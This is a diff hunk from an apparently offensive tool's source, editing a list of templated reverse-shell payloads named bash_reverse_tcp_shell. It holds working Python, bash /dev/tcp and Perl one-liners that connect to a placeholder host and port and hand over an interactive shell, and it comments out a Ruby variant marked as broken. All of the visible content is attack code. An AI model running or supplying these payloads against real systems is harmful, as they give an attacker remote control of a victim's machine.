@@ -15,7 +15,8 @@ bash_reverse_tcp_shell = [
     """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%(shell)s","-i"]);'""",
     "sleep 1; /bin/bash -c \'%(shell)s 0</dev/tcp/%(host)s/%(port)s 1>&0 2>&0\'",
     """perl -e 'use Socket;$i="%(host)s";$p=%(port)s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%(shell)s -i");};'""",
-    """ruby -rsocket -e'f=TCPSocket.open("%(host)s",%(port)s).to_i;exec sprintf("%(shell)s -i <&%%d >&%%d 2>&%%d",f,f,f)'""",
+# TODO: ruby payload's broken, fix it.
+#    """ruby -rsocket -e'f=TCPSocket.open("%(host)s",%(port)s).to_i;exec sprintf("%(shell)s -i <&%%d >&%%d 2>&%%d",f,f,f)'""",
     """sleep 1; python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("%(shell)s");'""",
 ]
 
